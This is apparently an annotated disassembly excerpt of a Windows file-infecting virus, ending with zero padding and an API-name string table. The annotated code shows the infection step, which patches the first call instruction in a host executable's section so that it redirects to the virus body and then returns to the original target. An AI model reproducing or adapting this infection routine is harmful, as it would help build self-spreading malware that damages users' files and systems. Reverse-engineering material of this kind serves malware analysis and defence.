.data:00403684                 mov     ss:dword_401BD5[ebp], edi ; move pointer to the code section
.data:0040368A                 jmp     short loc_403692 ; if above jump here
.data:0040368C ; ---------------------------------------------------------------------------
.data:0040368C
.data:0040368C loc_40368C:                             ; CODE XREF: open_file+23A\u2191j
.data:0040368C                                         ; open_file+244\u2191j
.data:0040368C                 dec     ecx             ; ecx --
.data:0040368D                 add     edi, 28h ; '('  ; move to the next section
.data:00403690                 jmp     short loc_403666 ; jump here
.data:00403692 ; ---------------------------------------------------------------------------
.data:00403692
.data:00403692 loc_403692:                             ; CODE XREF: open_file+22F\u2191j
.data:00403692                                         ; open_file+24C\u2191j
.data:00403692                 mov     ecx, [edi+10h]  ; ecx = SizeOfRawData
.data:00403695                 mov     eax, [edi+14h]  ; eax = PointerToRawData
.data:00403698                 push    eax             ; save the pointer on the stack
.data:00403699                 mov     eax, [edi+0Ch]  ; eax = virtual addr
.data:0040369C                 add     eax, ss:dword_401BD1[ebp] ; eax = start addr = VA + image base
.data:004036A2                 sub     eax, [edi+14h]  ; eax - PointerToRawData
.data:004036A5                 sub     eax, ss:dword_401BB1[ebp] ; eax - start addr of mapped file
.data:004036AB                 mov     ss:dword_401767[ebp], eax ; save eax
.data:004036B1                 pop     eax             ; restore eax
.data:004036B2                 add     eax, ss:dword_401BB1[ebp] ; eax + start addr of the mapped file
.data:004036B8                 mov     ss:dword_401BCD[ebp], eax ; save addr of 1st section data
.data:004036BE                 mov     edi, eax        ; edi = data of mapped 1st section
.data:004036C0                 xor     eax, eax        ; eax = 0
.data:004036C2                 mov     al, 0E8h ; '\E8'  ; Opcode for call instruction
.data:004036C4                 repne scasb             ; scan every byte until opcode for call instruction is found
.data:004036C6                 dec     edi             ; dec edi to point to opcode for call instruction
.data:004036C7                 add     ss:dword_401767[ebp], edi ; addr of byte pointing to the call instruction
.data:004036CD                 inc     edi             ; increment to point to operand of the call instruction
.data:004036CE                 mov     esi, edi        ; esi = edi
.data:004036D0                 lodsd                   ; load original operand of the call instruction
.data:004036D1                 mov     edx, ss:dword_40176B[ebp] ; addr of the end of the mapped section (after packing routine)
.data:004036D7                 mov     ss:dword_40176B[ebp], eax ; save the original operand of the call instruction
.data:004036DD                 mov     eax, ss:dword_401763[ebp] ; eax = RVA of the end of the last section
.data:004036E3                 add     eax, ss:dword_401BD1[ebp] ; add addr of entry point of virus
.data:004036E9                 sub     eax, ss:dword_401767[ebp] ; number of bytes relative to the current instructino where the call needs to be made
.data:004036EF                 sub     eax, 5          ; minus size of call instr
.data:004036F2                 stosd                   ; load the computed relative address into the malware's offset
.data:004036F3                 push    edi             ; save addr
.data:004036F4                 mov     eax, ss:dword_401767[ebp] ; addr of original call instr
.data:004036FA                 add     eax, ss:dword_40176B[ebp] ; add original call insr operand
.data:00403700                 add     eax, 5          ; add size of call instr
.data:00403703                 mov     ss:dword_40176B[ebp], eax ; save calculated addr of original call instr
.data:00403709                 pop     edi             ; remove edi from stack
.data:0040370A                 mov     edi, edx        ; edi = addr of end of mapped section
.data:0040370C                 push    eax             ; save eax onto stack
.data:0040370D                 mov     al, 68h ; 'h'   ; al = opcode for push inst
.data:0040370F                 stosb                   ; store opcode at edi
.data:00403710                 pop     eax             ; restore eax
.data:00403711                 stosd                   ; store the computed addr
.data:00403712                 mov     al, 0C3h ; '\C3'  ; opcode for return instr
.data:00403714                 stosb                   ; store the opcode
.data:00403715
.data:00403715 loop_to_update_key:                     ; CODE XREF: open_file+2E9\u2193j
.data:00403715                 call    random_seed
.data:0040371A                 mov     ebx, 0Bh        ; ebx = 0Bh
.data:0040371F                 div     ebx             ; Divide the key by 0Bh
.data:00403721                 cmp     edx, 0          ; is it divisible by 0Bh?
.data:00403724                 jz      short close_handles ; yes so jump here
.data:00403726                 stosd                   ; store string
.data:00403727                 jmp     short loop_to_update_key ; continue looping
.data:00403729 ; ---------------------------------------------------------------------------
.data:00403729
.data:00403729 close_handles:                          ; CODE XREF: open_file+2E6\u2191j
.data:00403729                 mov     eax, ss:dword_401BB1[ebp] ; start addr of mapped file
.data:0040372F                 push    eax             ; save param start addr of mapped file
.data:00403730                 mov     eax, ss:dword_40187A[ebp] ; UnmapViewOfFile
.data:00403736                 call    eax             ; UnmapViewOfFile()
.data:00403738                 mov     eax, ss:dword_401BAD[ebp] ; file map object handle
.data:0040373E                 push    eax             ; save handle as param
.data:0040373F                 mov     eax, ss:dword_40188A[ebp] ; CloseHandle
.data:00403745                 call    eax             ; CloseHandle()
.data:00403747                 mov     eax, ss:dword_401BA9[ebp] ; file handle
.data:0040374D                 push    eax             ; save handle as param
.data:0040374E                 mov     eax, ss:dword_40188A[ebp] ; CloseHandle
.data:00403754                 call    eax             ; CloseHandle()
.data:00403756                 retn                    ; return
.data:00403756 open_file       endp
.data:00403756
.data:00403756 ; ---------------------------------------------------------------------------
.data:00403757                 db    0
.data:00403758                 db    0
.data:00403759                 db    0
.data:0040375A                 db    0
.data:0040375B                 db    0
.data:0040375C                 db    0
.data:0040375D                 db    0
.data:0040375E                 db    0
.data:0040375F                 db    0
.data:00403760                 db    0
.data:00403761                 db    0
.data:00403762                 db    0
.data:00403763                 db    0
.data:00403764                 db    0
.data:00403765                 db    0
.data:00403766                 db    0
.data:00403767                 db    0
.data:00403768                 db    0
.data:00403769                 db    0
.data:0040376A                 db    0
.data:0040376B                 db    0
.data:0040376C                 db    0
.data:0040376D                 db    0
.data:0040376E                 db    0
.data:0040376F                 db    0
.data:00403770                 db    0
.data:00403771                 db    0
.data:00403772                 db    0
.data:00403773                 db  14h
.data:00403774                 db    8
.data:00403775                 db  33h ; 3
.data:00403776                 db    0
.data:00403777                 db  14h
.data:00403778                 db  30h ; 0
.data:00403779                 db    0
.data:0040377A                 db    0
.data:0040377B                 db  0Eh
.data:0040377C                 db  10h
.data:0040377D                 db  40h ; @
.data:0040377E                 db    0
.data:0040377F                 db  1Ah
.data:00403780                 db  10h
.data:00403781                 db  40h ; @
.data:00403782                 db    0
.data:00403783                 db    0
.data:00403784                 db  4Ch ; L
.data:00403785                 db  6Fh ; o
.data:00403786                 db  61h ; a
.data:00403787                 db  64h ; d
.data:00403788                 db  4Ch ; L
.data:00403789                 db  69h ; i
.data:0040378A                 db  62h ; b
.data:0040378B                 db  72h ; r
.data:0040378C                 db  61h ; a
.data:0040378D                 db  72h ; r
.data:0040378E                 db  79h ; y
.data:0040378F                 db    0
.data:00403790                 db 0BFh ; \BF
.data:00403791                 db 0BDh ; \BD
.data:00403792                 db  63h ; c
.data:00403793                 db  75h ; u
.data:00403794                 db  47h ; G
.data:00403795                 db  65h ; e
.data:00403796                 db  74h ; t
.data:00403797                 db  50h ; P
.data:00403798                 db  72h ; r
.data:00403799                 db  6Fh ; o
.data:0040379A                 db  63h ; c
.data:0040379B                 db  41h ; A
.data:0040379C                 db  64h ; d
.data:0040379D                 db  64h ; d
.data:0040379E                 db  72h ; r
.data:0040379F                 db  65h ; e
.data:004037A0                 db  73h ; s
.data:004037A1                 db  73h ; s
.data:004037A2                 db    0
.data:004037A3                 db    0
.data:004037A4                 db    0
.data:004037A5                 db    0
.data:004037A6                 db    0
.data:004037A7                 db  47h ; G
.data:004037A8                 db  6Ch ; l
.data:004037A9                 db  6Fh ; o
.data:004037AA                 db  62h ; b
.data:004037AB                 db  61h ; a
.data:004037AC                 db  6Ch ; l
.data:004037AD                 db  41h ; A
.data:004037AE                 db  6Ch ; l
.data:004037AF                 db  6Ch ; l
.data:004037B0                 db  6Fh ; o
.data:004037B1                 db  63h ; c
.data:004037B2                 db    0
.data:004037B3                 db  99h ; \99
.data:004037B4                 db 0C0h ; \C0
.data:004037B5                 db  63h ; c
.data:004037B6                 db  75h ; u
.data:004037B7                 db  47h ; G
.data:004037B8                 db  6Ch ; l
.data:004037B9                 db  6Fh ; o
.data:004037BA                 db  62h ; b
.data:004037BB                 db  61h ; a
.data:004037BC                 db  6Ch ; l
.data:004037BD                 db  46h ; F
.data:004037BE                 db  72h ; r
.data:004037BF                 db  65h ; e
.data:004037C0                 db  65h ; e
.data:004037C1                 db    0
.data:004037C2                 db 0F1h ; \F1
.data:004037C3                 db  75h ; u
.data:004037C4                 db  63h ; c
.data:004037C5                 db  75h ; u
.data:004037C6                 db  43h ; C
.data:004037C7                 db  72h ; r
.data:004037C8                 db  65h ; e
.data:004037C9                 db  61h ; a
.data:004037CA                 db  74h ; t
.data:004037CB                 db  65h ; e
.data:004037CC                 db  46h ; F
.data:004037CD                 db  69h ; i
.data:004037CE                 db  6Ch ; l
.data:004037CF                 db  65h ; e
.data:004037D0                 db    0
.data:004037D1                 db 0C1h ; \C1
.data:004037D2                 db  6Fh ; o
.data:004037D3                 db  66h ; f
.data:004037D4                 db  75h ; u
.data:004037D5                 db  43h ; C
.data:004037D6                 db  72h ; r
.data:004037D7                 db  65h ; e
.data:004037D8                 db  61h ; a
.data:004037D9                 db  74h ; t
.data:004037DA                 db  65h ; e
.data:004037DB                 db  46h ; F
.data:004037DC                 db  69h ; i
.data:004037DD                 db  6Ch ; l
.data:004037DE                 db  65h ; e
.data:004037DF                 db  4Dh ; M
.data:004037E0                 db  61h ; a
.data:004037E1                 db  70h ; p
.data:004037E2                 db  70h ; p
.data:004037E3                 db  69h ; i
.data:004037E4                 db  6Eh ; n
.data:004037E5                 db  67h ; g
.data:004037E6                 db    0
.data:004037E7                 db 0D9h ; \D9
.data:004037E8                 db 0ADh ; \AD
.data:004037E9                 db  63h ; c
.data:004037EA                 db  75h ; u
.data:004037EB                 db  4Dh ; M
.data:004037EC                 db  61h ; a
.data:004037ED                 db  70h ; p
.data:004037EE                 db  56h ; V
.data:004037EF                 db  69h ; i
.data:004037F0                 db  65h ; e
.data:004037F1                 db  77h ; w
.data:004037F2                 db  4Fh ; O
.data:004037F3                 db  66h ; f
.data:004037F4                 db  46h ; F
.data:004037F5                 db  69h ; i
.data:004037F6                 db  6Ch ; l
.data:004037F7                 db  65h ; e
.data:004037F8                 db    0
.data:004037F9                 db  9Ah ; \9A
.data:004037FA                 db  9Eh ; \9E
.data:004037FB                 db  63h ; c
.data:004037FC                 db  75h ; u
.data:004037FD                 db  53h ; S
.data:004037FE                 db  65h ; e
.data:004037FF                 db  74h ; t
.data:00403800                 db  43h ; C
.data:00403801                 db  75h ; u
.data:00403802                 db  72h ; r
.data:00403803                 db  72h ; r
.data:00403804                 db  65h ; e
.data:00403805                 db  6Eh ; n
.data:00403806                 db  74h ; t
.data:00403807                 db  44h ; D
.data:00403808                 db  69h ; i
.data:00403809                 db  72h ; r
.data:0040380A                 db  65h ; e
.data:0040380B                 db  63h ; c
.data:0040380C                 db  74h ; t
.data:0040380D                 db  6Fh ; o
.data:0040380E                 db  72h ; r
.data:0040380F                 db  79h ; y
.data:00403810                 db    0
.data:00403811                 db 0EEh ; \EE
.data:00403812                 db  11h
.data:00403813                 db  65h ; e
.data:00403814                 db  75h ; u
.data:00403815                 db  47h ; G
.data:00403816                 db  65h ; e
.data:00403817                 db  74h ; t
.data:00403818                 db  43h ; C
.data:00403819                 db  75h ; u
.data:0040381A                 db  72h ; r
.data:0040381B                 db  72h ; r
.data:0040381C                 db  65h ; e
.data:0040381D                 db  6Eh ; n
.data:0040381E                 db  74h ; t
.data:0040381F                 db  50h ; P
.data:00403820                 db  72h ; r
.data:00403821                 db  6Fh ; o
.data:00403822                 db  63h ; c
.data:00403823                 db  65h ; e
.data:00403824                 db  73h ; s
.data:00403825                 db  73h ; s
.data:00403826                 db    0
.data:00403827                 db  37h ; 7
.data:00403828                 db  69h ; i
.data:00403829                 db  63h ; c
.data:0040382A                 db  75h ; u
.data:0040382B                 db  53h ; S
.data:0040382C                 db  65h ; e
.data:0040382D                 db  74h ; t
.data:0040382E                 db  50h ; P
.data:0040382F                 db  72h ; r
.data:00403830                 db  69h ; i
.data:00403831                 db  6Fh ; o
.data:00403832                 db  72h ; r
.data:00403833                 db  69h ; i
.data:00403834                 db  74h ; t
.data:00403835                 db  79h ; y
.data:00403836                 db  43h ; C
.data:00403837                 db  6Ch ; l
.data:00403838                 db  61h ; a
.data:00403839                 db  73h ; s
.data:0040383A                 db  73h ; s
.data:0040383B                 db    0
.data:0040383C                 db  24h ; $
.data:0040383D                 db  5Fh ; _
.data:0040383E                 db  64h ; d
.data:0040383F                 db  75h ; u
.data:00403840                 db  4Dh ; M
.data:00403841                 db  65h ; e
.data:00403842                 db  73h ; s
.data:00403843                 db  73h ; s
.data:00403844                 db  61h ; a
.data:00403845                 db  67h ; g
.data:00403846                 db  65h ; e
.data:00403847                 db  42h ; B
.data:00403848                 db  6Fh ; o
.data:00403849                 db  78h ; x
.data:0040384A                 db    0
.data:0040384B                 db    0
.data:0040384C                 db    0
.data:0040384D                 db    0
.data:0040384E                 db    0
.data:0040384F                 db  43h ; C
.data:00403850                 db  72h ; r
.data:00403851                 db  65h ; e
.data:00403852                 db  61h ; a
.data:00403853                 db  74h ; t
.data:00403854                 db  65h ; e
.data:00403855                 db  4Dh ; M
.data:00403856                 db  75h ; u
.data:00403857                 db  74h ; t
.data:00403858                 db  65h ; e
.data:00403859                 db  78h ; x
.data:0040385A                 db    0
.data:0040385B                 db  5Dh ; ]
.data:0040385C                 db  16h
.data:0040385D                 db  64h ; d
.data:0040385E                 db  75h ; u
.data:0040385F                 db  4Fh ; O
.data:00403860                 db  70h ; p
.data:00403861                 db  65h ; e
.data:00403862                 db  6Eh ; n
.data:00403863                 db  4Dh ; M
.data:00403864                 db  75h ; u
.data:00403865                 db  74h ; t
.data:00403866                 db  65h ; e
.data:00403867                 db  78h ; x
.data:00403868                 db    0
.data:00403869                 db 0C8h ; \C8
.data:0040386A                 db  88h ; \88
.data:0040386B                 db  63h ; c
.data:0040386C                 db  75h ; u
.data:0040386D                 db  52h ; R
.data:0040386E                 db  65h ; e
.data:0040386F                 db  6Ch ; l
.data:00403870                 db  65h ; e
.data:00403871                 db  61h ; a
.data:00403872                 db  73h ; s
.data:00403873                 db  65h ; e
.data:00403874                 db  4Dh ; M
.data:00403875                 db  75h ; u
.data:00403876                 db  74h ; t
.data:00403877                 db  65h ; e
.data:00403878                 db  78h ; x
.data:00403879                 db    0
.data:0040387A                 db  61h ; a
.data:0040387B                 db  16h
.data:0040387C                 db  63h ; c
.data:0040387D                 db  75h ; u
.data:0040387E                 db  55h ; U
.data:0040387F                 db  6Eh ; n
.data:00403880                 db  6Dh ; m
.data:00403881                 db  61h ; a
.data:00403882                 db  70h ; p
.data:00403883                 db  56h ; V
.data:00403884                 db  69h ; i
.data:00403885                 db  65h ; e
.data:00403886                 db  77h ; w
.data:00403887                 db  4Fh ; O
.data:00403888                 db  66h ; f
.data:00403889                 db  46h ; F
.data:0040388A                 db  69h ; i
.data:0040388B                 db  6Ch ; l
.data:0040388C                 db  65h ; e
.data:0040388D                 db    0
.data:0040388E                 db 0ADh ; \AD
.data:0040388F                 db  6Ch ; l
.data:00403890                 db  63h ; c
.data:00403891                 db  75h ; u
.data:00403892                 db  43h ; C
.data:00403893                 db  6Ch ; l
.data:00403894                 db  6Fh ; o
.data:00403895                 db  73h ; s
.data:00403896                 db  65h ; e
.data:00403897                 db  48h ; H
.data:00403898                 db  61h ; a
.data:00403899                 db  6Eh ; n
.data:0040389A                 db  64h ; d
.data:0040389B                 db  6Ch ; l
.data:0040389C                 db  65h ; e
.data:0040389D                 db    0
.data:0040389E                 db 0C9h ; \C9
.data:0040389F                 db  6Bh ; k
.data:004038A0                 db  63h ; c
.data:004038A1                 db  75h ; u
.data:004038A2                 db  47h ; G
.data:004038A3                 db  65h ; e
.data:004038A4                 db  74h ; t
.data:004038A5                 db  54h ; T
.data:004038A6                 db  69h ; i
.data:004038A7                 db  63h ; c
.data:004038A8                 db  6Bh ; k
.data:004038A9                 db  43h ; C
.data:004038AA                 db  6Fh ; o
.data:004038AB                 db  75h ; u
.data:004038AC                 db  6Eh ; n
.data:004038AD                 db  74h ; t
.data:004038AE                 db    0
.data:004038AF                 db 0F2h ; \F2
.data:004038B0                 db  67h ; g
.data:004038B1                 db  63h ; c
.data:004038B2                 db  75h ; u
.data:004038B3                 db  47h ; G
.data:004038B4                 db  65h ; e
.data:004038B5                 db  74h ; t
.data:004038B6                 db  46h ; F
.data:004038B7                 db  69h ; i
.data:004038B8                 db  6Ch ; l
.data:004038B9                 db  65h ; e
.data:004038BA                 db  53h ; S
.data:004038BB                 db  69h ; i
.data:004038BC                 db  7Ah ; z
.data:004038BD                 db  65h ; e
.data:004038BE                 db    0
.data:004038BF                 db  6Fh ; o
.data:004038C0                 db 0A0h ; \A0
.data:004038C1                 db  63h ; c
.data:004038C2                 db  75h ; u
.data:004038C3                 db  46h ; F
.data:004038C4                 db  69h ; i
.data:004038C5                 db  6Eh ; n
.data:004038C6                 db  64h ; d
.data:004038C7                 db  46h ; F
.data:004038C8                 db  69h ; i
.data:004038C9                 db  72h ; r
.data:004038CA                 db  73h ; s
.data:004038CB                 db  74h ; t
.data:004038CC                 db  46h ; F
.data:004038CD                 db  69h ; i
.data:004038CE                 db  6Ch ; l
.data:004038CF                 db  65h ; e
.data:004038D0                 db    0
.data:004038D1                 db  0Ch
.data:004038D2                 db 0A9h ; \A9
.data:004038D3                 db  64h ; d
.data:004038D4                 db  75h ; u
.data:004038D5                 db  47h ; G
.data:004038D6                 db  65h ; e
.data:004038D7                 db  74h ; t
.data:004038D8                 db  46h ; F
.data:004038D9                 db  69h ; i
.data:004038DA                 db  6Ch ; l
.data:004038DB                 db  65h ; e
.data:004038DC                 db  41h ; A
.data:004038DD                 db  74h ; t
.data:004038DE                 db  74h ; t
.data:004038DF                 db  72h ; r
.data:004038E0                 db  69h ; i
.data:004038E1                 db  62h ; b
.data:004038E2                 db  75h ; u
.data:004038E3                 db  74h ; t
.data:004038E4                 db  65h ; e
.data:004038E5                 db  73h ; s
.data:004038E6                 db    0
.data:004038E7                 db    2
.data:004038E8                 db 0C6h ; \C6
.data:004038E9                 db  63h ; c
.data:004038EA                 db  75h ; u
.data:004038EB                 db  46h ; F
.data:004038EC                 db  69h ; i
.data:004038ED                 db  6Eh ; n
.data:004038EE                 db  64h ; d
.data:004038EF                 db  4Eh ; N
.data:004038F0                 db  65h ; e
.data:004038F1                 db  78h ; x
.data:004038F2                 db  74h ; t
.data:004038F3                 db  46h ; F
.data:004038F4                 db  69h ; i
.data:004038F5                 db  6Ch ; l
.data:004038F6                 db  65h ; e
.data:004038F7                 db    0
.data:004038F8                 db  3Ch ; <
.data:004038F9                 db 0AAh ; \AA
.data:004038FA                 db  64h ; d
.data:004038FB                 db  75h ; u
.data:004038FC                 db  46h ; F
.data:004038FD                 db  69h ; i
.data:004038FE                 db  6Eh ; n
.data:004038FF                 db  64h ; d
.data:00403900                 db  43h ; C
.data:00403901                 db  6Ch ; l
.data:00403902                 db  6Fh ; o
.data:00403903                 db  73h ; s
.data:00403904                 db  65h ; e
.data:00403905                 db    0
.data:00403906                 db 0A0h ; \A0
.data:00403907                 db 0DCh ; \DC
.data:00403908                 db  63h ; c
.data:00403909                 db  75h ; u
.data:0040390A                 db    0
.data:0040390B                 db    0
.data:0040390C                 db    0
.data:0040390D                 db    0
.data:0040390E                 db    0
.data:0040390F                 db    0
.data:00403910                 db    0
.data:00403911                 db    0
.data:00403912                 db    0
.data:00403913                 db    0
.data:00403914                 db    0
.data:00403915                 db    0
.data:00403916                 db    0
.data:00403917                 db    0
.data:00403918                 db    0
.data:00403919                 db    0
.data:0040391A                 db    0
.data:0040391B                 db    0
.data:0040391C                 db    0
.data:0040391D                 db    0
.data:0040391E                 db    0
.data:0040391F                 db    0
.data:00403920                 db    0
.data:00403921                 db    0
.data:00403922                 db    0
.data:00403923                 db    0
.data:00403924                 db    0
.data:00403925                 db    0
.data:00403926                 db    0
.data:00403927                 db    0
.data:00403928                 db    0
.data:00403929                 db    0
.data:0040392A                 db    0
.data:0040392B                 db    0
.data:0040392C                 db    0
.data:0040392D                 db    0
.data:0040392E                 db    0
.data:0040392F                 db    0
.data:00403930                 db    0
.data:00403931                 db    0
.data:00403932                 db    0
.data:00403933                 db    0
.data:00403934                 db    0
.data:00403935                 db    0
.data:00403936                 db    0
.data:00403937                 db    0
.data:00403938                 db    0
.data:00403939                 db    0
.data:0040393A                 db    0
.data:0040393B                 db    0
.data:0040393C                 db    0
.data:0040393D                 db    0
.data:0040393E                 db    0
.data:0040393F                 db    0
.data:00403940                 db    0
.data:00403941                 db    0
.data:00403942                 db    0
.data:00403943                 db    0
.data:00403944                 db    0
.data:00403945                 db    0
.data:00403946                 db    0
.data:00403947                 db    0
.data:00403948                 db    0
.data:00403949                 db    0
.data:0040394A                 db    0
.data:0040394B                 db    0
.data:0040394C                 db    0
.data:0040394D                 db    0
.data:0040394E                 db    0
.data:0040394F                 db    0
.data:00403950                 db    0
.data:00403951                 db    0
.data:00403952                 db    0
.data:00403953                 db    0
.data:00403954                 db    0
.data:00403955                 db    0
.data:00403956                 db    0
.data:00403957                 db    0
.data:00403958                 db    0
.data:00403959                 db    0
.data:0040395A                 db    0
.data:0040395B                 db    0
.data:0040395C                 db    0
.data:0040395D                 db    0
.data:0040395E                 db    0
.data:0040395F                 db    0
.data:00403960                 db    0
.data:00403961                 db    0
.data:00403962                 db    0
.data:00403963                 db    0
.data:00403964                 db    0
.data:00403965                 db    0
.data:00403966                 db    0
.data:00403967                 db    0
.data:00403968                 db    0
.data:00403969                 db    0
.data:0040396A                 db    0
.data:0040396B                 db    0
.data:0040396C                 db    0
.data:0040396D                 db    0
.data:0040396E                 db    0
.data:0040396F                 db    0
.data:00403970                 db    0
.data:00403971                 db    0
.data:00403972                 db    0
.data:00403973                 db    0
.data:00403974                 db    0
.data:00403975                 db    0
.data:00403976                 db    0
.data:00403977                 db    0
.data:00403978                 db    0
.data:00403979                 db    0
.data:0040397A                 db    0
.data:0040397B                 db    0
.data:0040397C                 db    0
.data:0040397D                 db    0
.data:0040397E                 db    0
.data:0040397F                 db    0
.data:00403980                 db    0
.data:00403981                 db    0
.data:00403982                 db    0
.data:00403983                 db    0
.data:00403984                 db    0
.data:00403985                 db    0
.data:00403986                 db    0
.data:00403987                 db    0
.data:00403988                 db    0
.data:00403989                 db    0
.data:0040398A                 db    0
.data:0040398B                 db    0
.data:0040398C                 db    0
.data:0040398D                 db    0
.data:0040398E                 db    0
.data:0040398F                 db    0
.data:00403990                 db    0
.data:00403991                 db    0
.data:00403992                 db    0
.data:00403993                 db    0
.data:00403994                 db    0
.data:00403995                 db    0
.data:00403996                 db    0
.data:00403997                 db    0
.data:00403998                 db    0
.data:00403999                 db    0
.data:0040399A                 db    0
.data:0040399B                 db    0
.data:0040399C                 db    0
.data:0040399D                 db    0
.data:0040399E                 db    0
.data:0040399F                 db    0
.data:004039A0                 db    0
.data:004039A1                 db    0
.data:004039A2                 db    0
.data:004039A3                 db    0
.data:004039A4                 db    0
.data:004039A5                 db    0
.data:004039A6                 db    0
.data:004039A7                 db    0
.data:004039A8                 db    0
.data:004039A9                 db    0
.data:004039AA                 db    0
.data:004039AB                 db    0
.data:004039AC                 db    0
.data:004039AD                 db    0
.data:004039AE                 db    0
.data:004039AF                 db    0
.data:004039B0                 db    0
.data:004039B1                 db    0
.data:004039B2                 db    0
.data:004039B3                 db    0
.data:004039B4                 db    0
.data:004039B5                 db    0
.data:004039B6                 db    0
.data:004039B7                 db    0
.data:004039B8                 db    0
.data:004039B9                 db    0
.data:004039BA                 db    0
.data:004039BB                 db    0
.data:004039BC                 db    0
.data:004039BD                 db    0
.data:004039BE                 db    0
.data:004039BF                 db    0
.data:004039C0                 db    0
.data:004039C1                 db    0
.data:004039C2                 db    0
.data:004039C3                 db    0
.data:004039C4                 db    0
.data:004039C5                 db    0
.data:004039C6                 db    0
.data:004039C7                 db    0
.data:004039C8                 db    0
.data:004039C9                 db    0
.data:004039CA                 db    0
.data:004039CB                 db    0
.data:004039CC                 db    0
.data:004039CD                 db    0
.data:004039CE                 db    0
.data:004039CF                 db    0
.data:004039D0                 db    0
.data:004039D1                 db    0
.data:004039D2                 db    0
.data:004039D3                 db    0
.data:004039D4                 db    0
.data:004039D5                 db    0
.data:004039D6                 db    0
.data:004039D7                 db    0
.data:004039D8                 db    0
.data:004039D9                 db    0
.data:004039DA                 db    0
.data:004039DB                 db    0
.data:004039DC                 db    0
.data:004039DD                 db    0
.data:004039DE                 db    0
.data:004039DF                 db    0
.data:004039E0                 db    0
.data:004039E1                 db    0
.data:004039E2                 db    0
.data:004039E3                 db    0
.data:004039E4                 db    0
.data:004039E5                 db    0
.data:004039E6                 db    0
.data:004039E7                 db    0
.data:004039E8                 db    0
.data:004039E9                 db    0
.data:004039EA                 db    0
.data:004039EB                 db    0
.data:004039EC                 db    0
.data:004039ED                 db    0
.data:004039EE                 db    0
.data:004039EF                 db    0
.data:004039F0                 db    0
.data:004039F1                 db    0
.data:004039F2                 db    0
.data:004039F3                 db    0
.data:004039F4                 db    0
.data:004039F5                 db    0
.data:004039F6                 db    0
.data:004039F7                 db    0
.data:004039F8                 db    0
.data:004039F9                 db    0
.data:004039FA                 db    0
.data:004039FB                 db    0
.data:004039FC                 db    0
.data:004039FD                 db    0
.data:004039FE                 db    0
.data:004039FF                 db    0
.data:00403A00                 db    0
.data:00403A01                 db    0
.data:00403A02                 db    0
.data:00403A03                 db    0
.data:00403A04                 db    0
.data:00403A05                 db    0
.data:00403A06                 db    0
.data:00403A07                 db    0
.data:00403A08                 db    0
.data:00403A09                 db    0
.data:00403A0A                 db    0
.data:00403A0B                 db    0
.data:00403A0C                 db    0
.data:00403A0D                 db    0
.data:00403A0E                 db    0
.data:00403A0F                 db    0
.data:00403A10                 db    0
.data:00403A11                 db    0
.data:00403A12                 db    0
.data:00403A13                 db    0
.data:00403A14                 db    0
.data:00403A15                 db    0
.data:00403A16                 db    0
.data:00403A17                 db    0
.data:00403A18                 db    0
.data:00403A19                 db    0
.data:00403A1A                 db    0
.data:00403A1B                 db    0
.data:00403A1C                 db    0
.data:00403A1D                 db    0
.data:00403A1E                 db    0
.data:00403A1F                 db    0
.data:00403A20                 db    0
.data:00403A21                 db    0
.data:00403A22                 db    0
.data:00403A23                 db    0
.data:00403A24                 db    0
.data:00403A25                 db    0
.data:00403A26                 db    0
.data:00403A27                 db    0
.data:00403A28                 db    0
.data:00403A29                 db    0
.data:00403A2A                 db    0
.data:00403A2B                 db    0
.data:00403A2C                 db    0
.data:00403A2D                 db    0
.data:00403A2E                 db    0
.data:00403A2F                 db    0
.data:00403A30                 db    0
.data:00403A31                 db    0
.data:00403A32                 db    0
.data:00403A33                 db    0
.data:00403A34                 db    0
.data:00403A35                 db    0
.data:00403A36                 db    0
.data:00403A37                 db    0
.data:00403A38                 db    0
.data:00403A39                 db    0
.data:00403A3A                 db    0
.data:00403A3B                 db    0
.data:00403A3C                 db    0
.data:00403A3D                 db    0
.data:00403A3E                 db    0
.data:00403A3F                 db    0
.data:00403A40                 db    0
.data:00403A41                 db    0
.data:00403A42                 db    0
.data:00403A43                 db    0
.data:00403A44                 db    0
.data:00403A45                 db    0
.data:00403A46                 db    0
.data:00403A47                 db    0
.data:00403A48                 db    0
.data:00403A49                 db    0
.data:00403A4A                 db    0
.data:00403A4B                 db    0
.data:00403A4C                 db    0
.data:00403A4D                 db    0
.data:00403A4E                 db    0
.data:00403A4F                 db    0
.data:00403A50                 db    0
.data:00403A51                 db    0
.data:00403A52                 db    0
.data:00403A53                 db    0
.data:00403A54                 db    0
.data:00403A55                 db    0
.data:00403A56                 db    0
.data:00403A57                 db    0
.data:00403A58                 db    0
.data:00403A59                 db    0
.data:00403A5A                 db    0
.data:00403A5B                 db    0
.data:00403A5C                 db    0
.data:00403A5D                 db    0
.data:00403A5E                 db    0
.data:00403A5F                 db    0
.data:00403A60                 db    0
.data:00403A61                 db    0
.data:00403A62                 db    0
.data:00403A63                 db    0
.data:00403A64                 db    0
.data:00403A65                 db    0
.data:00403A66                 db    0
.data:00403A67                 db    0
.data:00403A68                 db    0
.data:00403A69                 db    0
.data:00403A6A                 db    0
.data:00403A6B                 db    0
.data:00403A6C                 db    0
.data:00403A6D                 db    0
.data:00403A6E                 db    0
.data:00403A6F                 db    0
.data:00403A70                 db    0
.data:00403A71                 db    0
.data:00403A72                 db    0
.data:00403A73                 db    0
.data:00403A74                 db    0
.data:00403A75                 db    0
.data:00403A76                 db    0
.data:00403A77                 db    0
.data:00403A78                 db    0
.data:00403A79                 db    0
.data:00403A7A                 db    0
.data:00403A7B                 db    0
.data:00403A7C                 db    0
.data:00403A7D                 db    0
.data:00403A7E                 db    0
.data:00403A7F                 db    0
.data:00403A80                 db    0
.data:00403A81                 db    0
.data:00403A82                 db    0
.data:00403A83                 db    0
.data:00403A84                 db    0
.data:00403A85                 db    0
.data:00403A86                 db    0
.data:00403A87                 db    0
.data:00403A88                 db    0
.data:00403A89                 db    0
.data:00403A8A                 db    0
.data:00403A8B                 db    0
.data:00403A8C                 db    0
.data:00403A8D                 db    0
.data:00403A8E                 db    0
.data:00403A8F                 db    0
.data:00403A90                 db    0
.data:00403A91                 db    0
.data:00403A92                 db    0
.data:00403A93                 db    0
.data:00403A94                 db    0
.data:00403A95                 db    0
.data:00403A96                 db    0
.data:00403A97                 db    0
.data:00403A98                 db  75h ; u
.data:00403A99                 db  73h ; s
.data:00403A9A                 db  65h ; e
.data:00403A9B                 db  72h ; r
.data:00403A9C                 db  33h ; 3
.data:00403A9D                 db  32h ; 2
.data:00403A9E                 db    0
.data:00403A9F                 db  77h ; w
.data:00403AA0                 db  73h ; s
.data:00403AA1                 db  6Fh ; o
.data:00403AA2                 db  63h ; c
.data:00403AA3                 db  6Bh ; k
.data:00403AA4                 db  33h ; 3
.data:00403AA5                 db  32h ; 2
